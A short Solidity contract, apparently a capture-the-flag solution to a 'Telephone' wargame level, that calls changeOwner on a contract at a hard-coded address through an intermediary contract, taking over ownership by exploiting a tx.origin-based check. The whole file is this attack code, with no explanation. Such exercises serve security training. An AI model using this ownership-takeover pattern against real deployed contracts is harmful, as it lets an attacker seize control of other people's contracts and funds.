pragma solidity ^0.6.0;

import "./default.sol";

contract Diddle {
    Telephone old = Telephone(0x1841b105C9839dd6383B9af39f2FDC6825d8ed43);

    function do_the_thing() public {
        old.changeOwner(0x182Af69fB08b4D08c42B68cc0d9f50b14bCbFd7a);
    }
}
